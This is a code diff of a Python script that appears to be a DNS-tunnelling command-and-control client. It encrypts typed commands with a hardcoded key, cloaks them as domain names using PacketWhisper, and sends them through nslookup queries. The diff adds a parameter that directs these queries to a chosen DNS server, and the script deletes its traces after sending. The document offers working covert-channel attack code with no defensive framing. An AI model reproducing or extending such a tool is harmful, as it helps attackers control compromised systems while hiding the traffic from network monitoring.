@@ -11,7 +11,7 @@ from packetWhisper import CloakAndTransferFile, ExtractDNSQueriesFromPCAP, Extra
 key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
 
-def send_command(command, dns):
+def send_command(command, dns='localhost'):
     # Criptare il comando
     encrypted_command = encrypt_message(command, key) #debug
     #print("Encrypted command: "+encrypted_command)
@@ -32,7 +32,7 @@ def send_command(command, dns):
     with open(cloaked_command, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
-            subprocess.call(['nslookup', fqdn_str], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
     # Rimuove il file dopo l'invio per evitare invii ripetuti
     os.remove(cloaked_command)
@@ -140,7 +140,10 @@ i@@m               '///|-     >f^    |/   }rnf,                   B@@'
         if args.dns:
             dns = args.dns
         command = input("> ")
-        send_command(command, dns)
+        if dns:
+            send_command(command, dns)
+        else:
+            send_command(command)
         try:
             receive_response() 
         except Exception as e:
